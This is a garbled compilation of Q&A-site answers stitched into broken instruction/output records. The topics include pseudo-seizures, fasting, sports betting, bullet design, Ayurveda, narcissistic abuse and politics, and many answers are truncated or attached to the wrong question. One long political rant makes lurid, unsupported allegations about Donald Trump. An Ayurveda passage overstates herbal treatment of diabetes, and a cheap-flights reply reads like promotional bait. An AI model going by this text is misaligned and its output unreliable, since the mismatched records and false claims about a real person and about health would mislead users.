memory with your family?What do you think about budgeting?

I don't know the statistics on it (or if they exist) but in my experience, they have mostly, if not all been young females. A percentage have a real seizure disorder mixed with the fake or pseudo seizures. A history of abuse was common with the patients that I saw. We had a couple that clearly wanted Midazolam and/or had a benzodiazepines addiction. Most of these had no idea what a seizure should look like or watched too much bad TV. They would just jerk and flop all over the place but, if you said “hold still\\" so I can get some medications into your IV, they would hold that arm perfectly still for you. Meanwhile continuing the jerking act with the other arm and legs. As soon as medication was given, they would be awake, answering questions appropriately, etc. ** A note here to clarify about the medication we gave in the IV. It was generally not benzos/midazolam but another medication, ordered by the neurologist for these episodes. Some were ordered midazolam but, it was up to the neurologist and the judgement of us on scene as to the seizure being real or not. We would always say that we needed to get to their IV, so we could give them the medication their doctor ordered. We never said we were giving drug “A, B or C” and instead, give saline. Hopefully, other facilities don't play those games either, its unethical… ** The other type of pseudo/fake-seizure patient was basically an expert at it. They could and did fool many seasoned nurses, doctors and therapists. It was usually something very subtle that made us suspicious. Sometimes it was frequent admissions to different facilities that threw the first red flag. Some were able to withstand all types of procedures and not “break\\". I intubated one patient in particular on 3 occasions over a 2 week period due to her being so good at it, she would desaturate and be apenic for an extended period. I have had to intubate several for this. Imagine the addiction they must have to put up with intubation ( of course, I didn't just intubate without proper oxygenation and premedications. I would use etomidate or propofol for induction, per RSI protocol ) The Neurological team thinks that most of this type probably have real seizures in addition to the fake ones. Most of the patients that had mixed fake and real seizures also had suffered horrible abuse in their life (another story for another day). We would transfer this type of patient to another local hospital for 24 hour video EEG surveillance. It was not usually long before we got a report from the video EEG that would definitively answer any questions."},{"instruction":"Why aren't there any tall buildings like the Empire State or Chrysler buildings anymore?","output":"“Why aren't there any tall buildings like the Empire State or Chrysler buildings anymore?” Well, it is obvious that there are many tall buildings, in NYC and elsewhere.

You want to know how people who eat only once or twice a day manage to not feel hungry between meals? Well, I'm going to tell you straight up that there is no one-size-fits-all answer to this question. But as a physical therapist who's worked with patients from all walks of life, I've seen some patterns emerge. First things first, let's talk about hunger. Hunger is a physiological response to an empty stomach. It's your body's way of telling you that it needs fuel. But here's the thing: hunger is not the same as appetite. Appetite is a psychological response to the thought or sight of food. It's why you might feel hungry even if your stomach is full after watching a cooking show or walking past a bakery. So, how do people who eat once or twice a day manage to not feel hungry between meals? Well, it all comes down to a few key factors. Let's break it down. 1. Adaptation One of the main reasons why some people can go longer periods without eating is because their bodies have adapted to this eating pattern. Our bodies are incredibly adaptable and can adjust to different circumstances, including changes in eating habits. For example, I had a patient who was a devout Muslim and would fast from sunrise to sunset during Ramadan. Initially, he found it very difficult to go without food for so many hours, but over time, his body adapted and he no longer felt as hungry during the day. 2. Meal composition Another factor that can affect hunger levels is the composition of the meals themselves. Eating meals that are high in protein and fiber can help you feel fuller for longer periods of time. These types of foods take longer to digest, which means that they release energy slowly and keep you feeling satisfied for longer. 3. Mindset Finally, the way we think about food and hunger can also have an impact on how hungry we feel. If you're constantly thinking about food and focusing on your hunger, you're likely to feel hungry more often. On the other hand, if you can distract yourself with other activities and thoughts, you may not feel as hungry. I had a patient who was trying to lose weight and was constantly thinking about food. She would read recipes online and watch cooking shows, which only made her hunger worse. Once she started focusing on other activities, like going for walks or reading books, she found that she didn't feel as hungry as often. But why should you care? Now, you might be thinking, \\"Well, that's all well and good, but why should I care about people who eat once or twice a day?\\" Great question, my friend. The truth is, there are some potential benefits to this type of eating pattern. Intermittent fasting, which involves going without food for extended periods of time, has been shown to have a number of health benefits, including improved insulin sensitivity, weight loss, and reduced inflammation. Of course, it's important to note that intermittent fasting isn't for everyone, and you should always talk to your doctor before making any changes to your diet. But it's worth considering if you're looking for a way to improve your overall health. The bottom line At the end of the day, everyone's body is different, and what works for one person may not work for another. Some people are simply better able to tolerate hunger than others, and there's nothing wrong with that.

Do you think India will back down from the purchase?","output":"nothing big about this, US knew it well that India won’t become an ally (their definition of ally is following white house orders). India will go around with iran and russia as usual. will forgo little oil imports if US is able to give some other attractive offer. US will forcefully sell some defence stuffs to India (in return of waiver for S-400) So don’t worry its going to be give and take. They won’t do anything against india for the next 35 years at least in the sense that “customer is king” is the principle of any business. And we do business as far as US is concerned. that’s not the case with Russia or Iran. if US had S-400, it wont have sold to India. only Russia shares such hi-tech and sensitive platforms with India.

Here are some important elements to consider: Knowledge and Research: Being knowledgeable about the sport or sports you are betting on is crucial. Understanding the rules, teams, players, and their performances can help you make more informed decisions. Stay updated with the latest news, statistics, and trends related to the sport.Strategy and Discipline: Develop a betting strategy that suits your style and goals. This could involve focusing on specific markets, analyzing historical data, using statistical models, or following expert advice. It's important to stick to your strategy and avoid impulsive or emotional betting decisions.Value Betting: Look for value in the odds offered by bookmakers. Value betting involves finding odds that are higher than the actual probability of an outcome occurring. By identifying undervalued bets, you increase your chances of long-term profitability.Risk Management: Assess the risks associated with each bet and consider factors such as team form, injuries, weather conditions, and other variables that can impact the outcome. Diversify your bets across different sports, markets, and events to spread the risk.Record Keeping and Analysis: Maintain a record of your bets, including details such as the date, event, type of bet, odds, and stake. This record can help you analyze your performance, identify strengths and weaknesses, and adjust your approach accordingly.Emotion and Discipline: Avoid letting emotions, biases, or personal preferences influence your betting decisions. Stay disciplined and avoid chasing losses or making impulsive bets. Stick to your strategy and make calculated, rational choices. Remember, sports betting involves an element of chance, and there are no guarantees of success. It's important to approach it as a form of entertainment and only wager money you can afford to lose."},{"instruction":"What is refueling in nuclear reactors?","output":"Refueling in nuclear reactors is removing the oldest fuel elements that have had the greatest burn-up of fuel (U-235 and/or Pu-239) with the greatest build-up of fission fragment poisons; and replacing them with fresh fuel elements.

Probably, because at some level you figure they might empathize. Sympathize. By sharing, you somehow believe it will make the world a slightly better place, by putting things into a better place. The problem is, none of that happens when you are dealing with a narcissist. They will not empathize, sympathize. You will not get any closure, by trying to set the record straight. Setting the record straight about how they have wronged you, does not work with them. You feel gutted about what they have done in the past, so you start a conversation trying to get the narcissist to understand how they have wronged you. All you achieve here is, you go into it gutted, you come out mind raped. You come out feeling exponentially worse. Why? How? F*ck why? Because you are dealing with a narcissist. You went into the interaction trying to get something out of it. They never give, only take. And when they see you want something from them, they take even more, and give even less. You have empowered them. You have just transferred a large, substantial dose of your vitality and energy to them, now the mountain to climb for you to feel better and get closure, is more than twice as high as before. Want some advice? And don't expect anything from them. No reasoning, no conversations, no understanding, no giving. They have none of that to give."},{"instruction":"Why is Israel attacking Damascus from Lebanese air space?","output":"Most likely because of mountains. Lebanon is a mountainous nation, with two major ranges, the Mount Lebanon range and the Anti-Lebanon range. Since news reports say that the Israeli planes launched their missiles from Lebanon, the best guess is that they are using the Lebanon ranges to shield aircraft from targeting by Syrian SAMs. The planes likely pop up, fire their missiles and dive back down. At least one news report from Lebanon quoted Lebanese witnesses as saying the Israeli planes were flying low over the country. This would indeed suggest that the aircraft were using the Lebanese mountains as cover. Satellite photo of Lebanon and Anti-Lebanon mountains from Wikipedia. Israeli aircraft likely fly in the valley between the mountains, pop up and fire missiles into Syrian targets within range of their cruise missiles, and drop down again. This allows the IAF to continue to target Hezbollah and Iranian assets in Syria, while reducing the threat of Syrian SAMs (particularly S300s.) It also obviates the need to strike the S300s, which might be partly crewed by Russian personnel. I don’t think the Syrians have any reluctance to fire SAMs over Lebanon, but they can’t hit what they can’t see, and/or missiles will lose locks on targets once the Israeli aircraft drop below the mountains."},{"instruction":"What are some things that only electrical and electronics engineers know, but most people don't?","output":"That all you need to know is: What the electrons are doingWhat the magnetic fields are doing Everything else is just a derivative.

This despite ALL OF THE FACTS. He has multiple CRIMINAL FEDERAL INDICTMENTS heading down the pipeline. With concrete evidence behind them. This is NO “witch hunt”, even though the Donald does practice some crafty nonsense. There is SOO much undisputable evidence that is stacking up against him in ALL of these cases. Most of it is SELF INFLICTED. For Example: Him talking to journalists at Bedminster when he knew he was being recorded for a book written by Pro-Trump writers who were later subpoenaed and handed over audio of Donny showing these journalist documents that were marked as highly classified documents, saying out loud everything he should not be saying. Like when he was President he could have declassified these documents but he didn’t and now he can’t and he could probably get into a lot of trouble by showing these to them. OMG Donny then WTF are you showing them to them? Simply the fact that he tweeted TWICE encouraging the continuation of the riot at the capital while it was in progress. This was after he stirred up the hornets nest before the riot and promised them he would go to the capital with them. Hours after people had already been severely injured and one person at least had died did he finally call off the dogs. This was NOT a false flag operation by an almost non existent antifa. That is a dog whistle. A Republican Dog Whistle. It doesn’t exist. But even if it did can you explain to me exactly what would be wrong with someone being “ANTI-FASCIST” That is where the name comes from. People who shout out “Fukc Antifa” at rallies and venues are basically saying “We Love Fascists We Love Fascists” WTF? That is so Anti-American it is ridiculous. How can you be a “Patriotic American” and NOT believe in DEMOCRACY? This on top of the things that EVERY REPUBLICAN IS COMPLETELY IGNORING about Donald Trumps past. His first wife Ivanna, when she filed for divorce from Donald, said that he often forced her into having sex with him and that the last time it happened he was so aggressive with her that he pulled her hair so hard that he ripped chunks of her scalp from her skull as she cried and he continued. In all fairness she did later walk those statements back. But the people who are friends with her say she was motivated to walk them back with more money from Donald. They were true. During that marriage to his first wife. He once took a family European vacation. He took with him on the flight to Europe his three oldest children and his wife Ivanna. Also on the plane (albeit not in first class with the rest of the family but still on the same exact plane) was his mistress Marla Maples. She also stayed at the same hotels Donald did throughout this vacation so that he could take breaks from the family and go have nookie nookie with his bed warmer. Slimy. Donald has NEVER been a faithful husband and has cheated on every single one of his wives. He cheated on Marla with Melania and then he cheated on Melania with at least Stormy Daniels and The Playboy Model. And those are just the ones that have come forward. He also doesn’t even wear a condom when he has unprotected sex with porn models. Honestly I would be more worried for them than I would be for Donald. He’s had his finger dipped in more cream pies then Bessy the Cow From Bordon. Then there is Donald when he used to own the Miss Teen USA pageantry system. “Teen” remember that word. Donald used to barge himself right into the dressing room at these contests when all of the contestants were mostly naked getting ready for the competition. He would shout out to the room: “Don’t worry ladies I’ve seen it all before.” He claimed he would be there for “inspections” because he was the owner of the pageant. Then later on Howard Stern he would brag about how he always was getting away with things like that because of who he was. There was also the time he went on Oprah Winfrey’s show with his daughter Ivanka. During the show Oprah was trying to throw them both some soft ball questions. She told them: “OK I am going to ask you to both answer the same question now. Tell me what do you two have in common with each other? What are some of the interests that you both share? Ivanka went first and she said “Real Estate, Golfing, and my love of New York”. Oprah “Oh that’s great. What about you Donald?” LONG PAUSE LONG PAUSE “Donald?” “Well… I was going to say SEX but I thought you would think that was inappropriate.” YES WE DO. Or the time he took Ivanka with him for an interview with Dr. Phil on his show. During that taping Donald asks Dr. Phil with his daughter sitting right next to him, “Is it wrong that I find myself being more sexually attracted to my “TEENAGED” daughter than I am to my own wife?” If you play back the version that was aired on TV you won’t get to see the reaction Dr. Phil had to this question. However there were over 200 people sitting in the live audience who did here the exchange and quickly started posting messages online about what they had just heard. And there is one of his favorite lines to tell people that he has repeated dozens of times on different interviews that: “I’ve always said that if Ivanka weren’t my daughter I would probably be dating her.” Gross Donald you daughter is NOT INTERESTED go crawl in a hole somewhere. This is one of my favorites and it is more recent. Donald is over six foot tall. He is usually the tallest person in the room. I think James Comey might have been a little taller and that might have been one of the reasons why Donald was so threatened by him. But about during his third year as President his youngest son Barren was having a growing spurt and was quickly approaching Donald’s same height. Donald asked the boy’s Dr.’s if there was something they could give him that would STUNT HIS GROWTH. Because he wanted to be taller than everyone… Is there a word similar to the Napoleon Syndrome but where someone just thinks they are the smallest in the room. STUNT HIS GROWTH… Disgusting. YET here we are with a 40.3% favorable rating. WHY? HE IS NO CONSERVATIVE. HE DID NOT DRAIN THE SWAMP he dredged it. You people are voting against your own interests and you continue to support him.

After that a qualified person and a trained back up person will go to the tank, one will enter with breathing apparatus and take air samples from all areas of the tank, the other person remains at the tank entrance as safety man. Once all tests have been carried out a safe to enter certificate will be issued.

You cannot do a strong measurement without an interaction. And interactions on the same particle always have a definite sequence. Let’s say position is measured first. That will not still be the same value when momentum is measured. And via versa. Now you could in principle do weak measurements (interference pattern) observations at the same time. But then neither would learn the value they measuring to the accuracy your technique requires. The cheat people try to use is measure entangled particles. As conservation laws allow you to derive the values of one entangled particle from another. Only what you learn is the two particles are related exactly the same as if it was a single particle measured at two different times. If you measure the same value twice you get consistent results. Otherwise all bets are off."},{"instruction":"Name one thing that made you smile today?","output":"That girl in my class who struggles for her education.

You could say he’s pretty much the “god of evil” in Christian theology. The thing about Christianity is, its capital-G God (also called Jehovah by some branches, Yahweh in Judaism, etc.) is described as all-powerful and all-knowing — that’s the level of power that the term “god” is reserved for in Christianity. Lesser beings are described as angels or devils or spirits instead, even though many of them would be considered gods by a polytheistic type of a worldview. Heck, some polytheistic religions believe that basically everything has a minor god of some sort associated with it. The term “god” means different things to different people, that’s basically what I’m saying here. And atheists don’t believe in any variety of gods. That’s the basic definition of the word “atheist.” Satan is also worshipped as a deity by certain types of Satanists (not all, though, despite what the name “Satanist” might imply — some types of Satanists are atheists themselves and only use Satan as a symbol rather than believing he exists as an actual being, for example.) So… yeah. Though not considered to be a god from a Christian perspective, an atheist would put him in the same category — and atheists by definition don’t believe that anything in that category exists."},{"instruction":"w do I know which kinematic equation to use?","output":"according to the values given to you in the question 1.if they have given initial velocity(u) and final velocity(v),time(t) then the equation to find acceleration(a) is v=u+at"},{"instruction":"What are the disadvantages a person can have after becoming a member of a Freemason?","output":"Probably none if you go in with reasonable expectations.

Some members may run afoul of their official religions. Imo, this is a gross misunderstanding of the rituals of Masonry. The official position of the Catholic Church is that a Freemason should not be in communion with the Church. However, I know many Catholic Masons and have never heard of one being excommunicated. Here are a few observations by my friends and I. You will never look at green beans in the same way again.

The most loving dog in the world. Hated having to… but… The net of it is Huskies are feral and not truly domesticated. They are domesticated in the sense they bond with humans and can get along, but otherwise totally feral. It is not an exercise issue, or any issue other than they are feral. They must hunt, roam, pack (with other dogs) and will no matter how bonded they are. Granted they most often return home, but it’s when they decide to return home. My fiance finally realized this (she had argued with me about it for 2 years) when we moved to my new farm. We have over 7 acres fenced in and the dog could run, play and roam. That said in 2 weeks it found a way over the fence and was gone. Huskies are not bad breeds, just still feral and you will never remove them from them without changing what a Huskie is. Unless you are keeping sled dogs in Alaska - please stop trying to own them."},{"instruction":"What is the difference between perfume, eau de toilette and cologne?","output":"Perfume is the most concentrated form of fragrance. It is made with a base of alcohol and water, and then it is mixed with essential oils. The alcohol evaporates quickly, so the perfume will last for hours. Eau de toilette is a less concentrated form of fragrance. It has a lower concentration of essential oils than perfume, so it will not last as long as perfume does on your skin. Cologne is an even less concentrated form of fragrance than eau de toilette. Cologne usually contains about 2% to 3% essential oils in its base, which means that it will only last for about 30 minutes on your skin before you need to reapply it."},{"instruction":"any way?","output":"The short answer is, yes, in fact, it is the most important thing.

Some label this as 'darknight of the soul', or may be 'existensial crisis' What do you do when everything you percieve is telling you to die? Without self-confidence that one doesn't need to rely on anything else, one's \\"essence\\" will disintegrate, this is true death. With self-confidence, one realize this \\"I simply am\\"..Self-confidence is the key so one can become one's own light.

Are private schools better than public schools?","output":"I have experience with both private and public schools. I have found that the teachers are better qualified and better trained in public schools. Consequently, instruction is better. So why do private schools have higher scores? There are a few reasons. First, look at public schools in high income areas. They also perform very well on tests. Basically, private schools start with better prepared raw material. A number of research studies have found that the number one indicator of student success in school is their mother’s level of education. I’ve worked in schools where the average mother was a college graduate. I’ve also worked in schools with parents who had an elementary school education. Whose kids do you think did better? Parents who can afford to send their kids to private schools tend to be wealthier and better educated. Often, their children are already reading when they enter kindergarten. Second, private schools are not bound by the same laws that cover public education. For one, they are allowed to select their student body. If a student is misbehaving, lower performing, or needs special education support, etc., the private school sends them off to the local public school. Third, private schools often require that the parents of their students either donate to the school, work a certain hours per month at the school, or both. Many lower income public school parents don’t have either the time or the resources to meet that requirement."},{"instruction":"Do all entrepreneurs need an outside investor?","output":"No."},{"instruction":"Are there alternatives to pistol slides?","output":"Oh yes.

Without getting into situations like someone having terminal cancer AND complete loneliness then what I mean by this is; in my time in prison, without the use of internet and while still having news you can only talk to other people and try to learn from what they say. While you must take their opinions with a grain of salt, you can still find wisdom in anything in life. I saw LGBT related news on the internet and while debating with a religious person on why this was only a thing recently and while they should have been around longer than 2010 (first time I seen a man who didn’t not want a woman, and we all looked down on it in a public school). He made an interesting point. How long have we been in this safe society? I understand there might be someone like me who can invade your house and threaten your family, but we don’t live in scary times where everyday was a struggle to eat or die (killing large and prey and even larger predators) worrying about food and shelter vs taxes and job security. Or how about offending a government like the Romans, worrying about black plague, colonialism/slavery, mass genocide. people seem to forget what our ancestors went through, now you’re going to be sad about gender related things????? Or perhaps you’re too shy to even talk to someone and make a friend?????? make it make sense. some people say: you must take the Buddhist approach and not want anything and you’ll be content, find peace and possibly happiness. But what if you just sacrificed time, even a decade and did the Tate approach. (There’s more guys out there spouting this but they aren’t coming to mind) sacrifice a few years possibly even a decade of your life. Dedicate it to only gaining wealth, working on your body, mind and soul. not wasting it partying or pleasing others. I strongly doubt you will not have what you seek. First you need money. That will solve 95% of your problems. From that you won’t need to work as much which opens your availability up. Now you can attend hobbies you actually want to do and slowly make friends that way. You may be bitter and resentful toward life at first but work something like “skip the dishes” where you are forced to interact with people. After a couple days of smiling and showing enthusiasm, it will feel natural again and you will be likeable/approachable. So we have beaten poverty which beats most problems, now we have beaten loneliness. I haven’t gotten to any problems past this as I have only reached this level. so why aren’t people happy? My answer: they choose not to be. They don’t want to make the choices that will make them happy. They need to stay in their comfort zone which is easy for them"},{"instruction":"w difficult was it for you to find your life purpose?","output":"The sheer hubris involved in the assumption that your life has a “purpose” boggles the mind.

By virtue of this question, and the way it’s phrased, it is obvious that you and many of the others responding to this question are unaware of the law. You have couched the question using a false assumption : that conservatives do not think gun regulation is a good thing — which is not true. Building a question based on a false assumption is “disinformation.” There are more than 300 gun regulation laws Most people who do not own fire arms are uneducated about gun control — mainly because the realm of firearms is already fully legislated and regulated. The problem that eludes you is the laws are not enforced. Gun regulation is indeed a good thing, we can ALL agree on that — and the conservatives already know that. (This is what makes your question questionably “disinformation”) Everyone agrees that strong gun regulation is beneficial to society. Even a 5th grader knows that. As do all conservatives.

The most important quality in a bullet is am aerodynamic shape. They must reach the target, often at ranges well in excess of 300 yards. Aside from aerodynamics, most bullets have some sort of critical secondary characteristic. Bullets such as the NATO SS109 round carry a stainless penetrator within the bullet. This is important because the round is a 5.56mm, not that much larger than a .22. As soon as it impacts anything at its very high velocity, it becomes unstable, so previous versions of the bullet were unable to penetrate a vehicle and then do damage inside. The penetrator changed that to a certain extent (you can only get so much energy out of a little bullet, though this is controversial). Some bullets are quite blunt, with a hollow point, which is designed to mushroom out when it hits its target. This ensures that the bullet will not pass through the target and hit an unintended target. Bullets designed for tubular magazines, such as the 30-30 Winchester, must have a bit of a blunt point, lest one bullet's tip ignite the primer of the bullet in front of it in the magazine.

It is an holistic approach to health that focuses on the body, mind, and spirit. Ayurveda is known as an effective form of treatment for a variety of medical conditions, including diabetes. Diabetes is a chronic metabolic disorder that is characterized by high blood sugar levels. It is caused by a combination of genetic and environmental factors, such as unhealthy eating habits, lack of exercise, and certain medications. Diabetes can lead to serious health complications if left untreated, such as heart disease, stroke, and kidney failure. Ayurveda aims to restore balance and harmony to the body, which is essential for proper functioning of the body’s systems. Ayurvedic treatment for diabetes involves a combination of lifestyle changes, herbal remedies, and dietary modifications. One of the most commonly prescribed ayurvedic remedies for diabetes is the use of herbal medicines. These are natural substances that are used to treat the symptoms and root causes of diabetes. The most common herbs used for diabetes management are: • Bitter gourd (Momordica charantia): This herb has been used for centuries to help lower blood sugar levels. It is believed to stimulate the pancreas to produce more insulin, which helps the body to regulate sugar levels. • Gymnema sylvestre: This herb is known to help reduce sugar cravings and decrease cholesterol levels. It is also believed to help improve the production of insulin. • Turmeric (Curcuma longa): This herb has anti-inflammatory properties and is believed to help reduce blood sugar levels. • Fenugreek (Trigonella foenum-graecum): Fenugreek is believed to help improve insulin sensitivity, which can help with blood sugar control. • Amalaki (Emblica officinalis): This ayurvedic herb is known to help reduce the risk of diabetes-related complications. In addition to herbal remedies, ayurveda recommends lifestyle modifications and dietary changes for diabetes management. These include: • Limiting carbohydrate intake: Eating a low-carbohydrate diet can help to control blood sugar levels. • Increasing physical activity: Regular exercise can help to improve insulin sensitivity and reduce the risk of diabetes-related complications. • Avoiding processed and fried foods: Eating a diet that is high in fresh fruits and vegetables can help to improve overall health. • Limiting sugar intake: Eating too much sugar can cause blood sugar levels to spike. • Practicing yoga and meditation: These activities can help to reduce stress and improve overall health. Ayurveda is an ancient form of traditional medicine that has been used for centuries to treat a variety of medical conditions, including diabetes. Ayurvedic treatment focuses on restoring balance and harmony to the body through lifestyle modifications, herbal remedies, and dietary changes. While there is no cure for diabetes, ayurvedic herbs and lifestyle changes can be used to help manage the condition and reduce the risk of diabetes-related complications.

Yes, Bhisma is greater than Krishna in terms of personal integrity.When Shukracharya asked Bali not to donate anything to the dwarf, Bali refused and said “Bhudevi said that “I’ll hold the one who has committed any sin but not the one who has renaged his promise”.” Bali donated the land to Vishnu who is in the incarnation of a dwarf.Bali is an Asura, but he has very good qualities and was a very good and charitable king. Inspite being an Asura, he never reneged his promise. But, Krishna did. However, raising weapon against the one who is battling another one is not fair according to the rules of “Dharma-yuddha”. When Bhisma defeated Arjuna and was about to slay Arjuna, Krishna was enraged and was about to attack Bhisma. So, the rules violated are: 1- Anyone should not interfere in the battle between two, Bhisma defeated Arjuna and was about to slay him. The battle ends when either one is killed, after sunset, or after one surrendered. So, clearly Krishna violated the rule. 2-The ones who are on the chariot should not attck the others who are foot soldiers or others and the ones who are without a chariot should not attack the ones who are on chariot. So, Krishna violated the rule by attacking the Bhisma who is on chariot. 3-A charioteer must serve the job as charioteer itself, no charioteer should battle. Charioteers can be killed and that’s fair according to the rules of Dharma-yuddha . Krishna is afterall a charioteer. Its foolish that he thinks he can defeat Bhisma who is the son of Ganga and an undefeated warrior. Only Karna, Ashwatthama and Shiva can defeat Bhisma in a fair fight. Bhisma is a very great person and he never broke his promises. He’s not like Krishna who reneges his promises. Now, some might argue that Shiva married Parvati inspite he promised he’ll not marry again.I’ll write down why Shiva married Parvati.After Sati immolated herself, Shiva was extremely sad and in case if he marries again, the woman might have the same situation as Sati, so Shiva pledged not to marry again. Tārakāsura had a clever boon from Brahma that he can only be defeated by Shiva’s son. In case you don’t know, what happened next, you can check in Wikipedia about what happened. Shiva married Parvati only to save the world but not out of anger or his brother in law was defeated by someone. Bhisma is 100% better than Krishna in terms of personal integrity and valiance as well. Attribution: Pictures: copyright lies with the concerned person and source.

And how do you move on in everyday life?","output":"Detaching oneself from trauma bonding is similar to the stages of grieving when someone we love dies. We grieve over the forced detachment (death) while choosing the detach from trauma bonding triggers grieving. Since everyone experiences grieving differently it only makes sense we might experience other forms of detachment in a similar fashion….The slight difference between both types of detachment is force and choice. There are days during the grieving process where detachment is unbearable and days where we feel stronger and empowered by the detachment. What plagues the survivors of npd abuse is our choice to save ourselves through detachment from the abuser. We live with our thoughts and decisions dictated for us while our emotions are played with like a toddler messing around with a slinky. We know our real ideas and thoughts are valid and reasonable although we are repeatedly told to ignore ourselves because the narcissist knows us better than we know ourselves. This forced mental conflict leaves us somewhat, if not entirely, dependent on the narcissists perspective. When we choose to detach from that mind control we battle with regaining self confidence, abandoning the narcissist because they somehow made us feel like they really wanted the best for us, and we battle our decision making. Since most narcissists are still living when we finally detach it's easier to feel compelled to reattach ourselves to the person that induced so much trauma because we learned how to survive through it before. Speaking for myself only, detachment from the trauma bond to my mother has been bittersweet. Bitter are the memories of crying to be loved, comforted when fear was overwhelming, or I just needed help to understand things. Sweeter than fresh honey from a beehive is knowing I am allowed to make my own decisions, associate with whomever I choose, and be the kind of mother my son deserves. Bitter is the financial situation I am battling but knowing I am not tied to an abusive person through financial security is sweet and allows me to sleep peacefully after 38 years of misery. I have days where I want to call my mother just to scream and curse at her but it will accomplish nothing. I maintain my detachment from any bond I felt or had with her and I remain with zero contact. I deserve a break for the rest of my life and damnit I'm taking it!"},{"instruction":"w and from where can I buy cheap flight tickets?","output":"The Cheap flight tickets on some websites arent really reliable, however me and my travel agency business have just gotten started and to get our business off the ground we are providing crazy discounts.

That’s what they are there for. It all comes down to HOW you use them. Men and women, who like myself are or were in broadcasting, use or used their diaphragms to push large amounts of air through the voice box when speaking. We didn’t strain our voices by asking them to carry the whole load. We were taught good vocal technique. Singers do the same. They don’t ask their throat to do the whole job. They sing from way down deep within, lurching with the aforementioned diaphragm. Lots and lots of breath control. Vocal coaches help them manage the use of air so they remain true to the pitch of their song, and not sharp (too much air) or flat (too little air). Just as. Instruction workers use safety glasses and hard hats foremen are taught to use bull horns as opposed to yelling. There is a lot of noise in those plants and the crew is wearing ear plugs. That piece of gear is invaluable. To do differently will strain your voice, causing horseness and damage. Nodules can form on the vocal cords and surgery to remove them becomes necessary. After that surgery it can take about a year before you can resume using your voice again. If you notice the signs of early vocal strain and horseness go see the doctor as soon as you can. You’ll be instructed to “lay off” using your instrument (your voice) for a time the doctor deems proper.

They would perform for their amusement and be given as gifts. A small price to pay for entertainment.

In 1866, Liechtenstein sent out an army of 80 men to participate in the Austro-Prussian War. They came back with 81 men, suffering no casualties and having made one friend. The Ancient Greeks used to exercise in the nude and the word Gymnasium actually means, “A place to exercise naked,” in Greek. In 1325, two rival Italian city states, Bologna and Moderna went to war over a stolen bucket. Between 1913 to 1915, people could mail babies via the US postal service. Ancient Thebes once assembled an elite military force consisting of 150 pairs of male gay lovers. They went undefeated in war for years. Pineapples In the 18th century, used to be rented as symbol of wealth and power. People would rent them for a single night just to show off to fellow partygoers. Ancient Rome was 8 times more densely populated then modern New York. The Austrian army once mistakenly attacked and fought against themselves during the battle of Caransebes.

It was a little over 10,000. I live in California and the bank teller, whom I have met several times over recent years was very pleasant about asking me if I was withdrawing the money for a particular reason. I said that I was. The withdrawal was to be by electronic transfer and so he also asked me if the transfer details had been handed directly to me by a person whom I knew worked for the organization to which the money was going or if I was sending the transfer to an unknown number which I was given by an e-mail. I said that the bank transfer details were in an e-mail. So he asked if I might mind calling the company which I knew was to receive my money in order to verify the transfer account details. Yes, I know that is asking me for a lot of work to complete a transaction with my own money. Why shouldn’t I have the right just to wire transfer my money to anyone whom I please as long as I have the numbers. Well the bank has a duty of care, I could have been defrauded. Someone might have intercepted my plan to transfer the money, someone may have sent me fraudulent transfer details, made up a fake invoice, any number of reasons why they may want to take my money and make it theirs. Well I called the company who had sent me the transfer details and confirmed the numbers of the transfer account and then rechecked all of the details twice more. To make certain the transaction was secure and would be delivered properly. I never get upset with bank tellers asking me to check or confirm any transactions. I do it myself and I am happy to have someone else with my account security in mind. Only a few months ago, the city where I currently live, Fresno was a victim of a scam. Someone sent them a bill for several million dollars, The city clerk who received the invoice passed it through, the invoice was from a company which the city did business with, or so it seemed. The cash was transferred via wire transfer to an account which was not cross checked. The invoice was a forgery, the transfer details were not the details of the real company, that company did not even do the work that was invoiced for. There was no system in place to double check invoices to work or services. The city lost several million dollars in a fraction of a second. The same scam was pulled on several other cities in Calidfornia in previous years. So when someone questions the reason why you are moving your money, . Smile, think about the reason, enjoy the moment of having someone care for you as a customer. Then verify the reason, confirm details and verify all reasons again. The moment that verification actually takes is going to save you the heartache of handing over your cash to some scammer to enjoy. Thanks for reading.

ENTJs are also more likely to enjoy engaging with people via activities, whereas INTJs are more likely to enjoy engaging with people in conversation. ENTJs may also be more comfortable making fast decisions, whereas INTJs may take longer to mull over things before coming to a conclusion.

And since there are two types, linear dichroism and circular dichroism, let’s be specific and note that it’s the first of these two (linear) that’s at play here. First, the name dichroism itself suggests an effect related to color. But that is not what leads to polarization. Polarization arises from differences in absorption. So let’s start there, and for the moment let’s talk about monochromatic light only. In some (crystalline) anisotropic materials there is a dipole moment associated with electron transitions in the constituent molecules, and it has a preferred orientation with respect to the structure of the molecule. What that means is that the likelihood of a transition (absorption or emission) will depend on the orientation of the molecule with respect to the electric field. Simply put, linearly polarized light will be absorbed more or less, according to its orientation (azimuth). The anisotropy therefore manifests itself as presenting to linearly polarized light two different absorption coefficients. Thus, as unpolarized light travels through a material exhibiting dichroism, the transmitted light becomes increasingly partially linearly polarized, with the polarized component aligned with the direction for which the absorption coefficient is smaller. Another effect can be seen. If the incident is already linearly polarized and not aligned with either of the absorption axes, the transmitted light will maintain its linear polarization but be rotated toward the axis showing less absorption. Thus linear dichroism presents one form of optical activity. But why was the effect given a name (dichroism) related to color? The answer lies in the fact that the magnitude of the differential absorption can depend on wavelength. That is, dichroism can exhibit dispersion. As a result, when white light passes through tourmaline and is viewed through a polarizer, the observed color of the transmitted light changes as the polarizer is rotated. One can imagine this being the first observation that was made on such crystals, and so the effect was given a color-related name, which stuck."},{"instruction":"ve the Democrats ever been as far to the left as they are in the 2019/2020 election cycle?","output":"I don’t know, but I do know the GOP is way farther to the right than I’ve ever seen it.

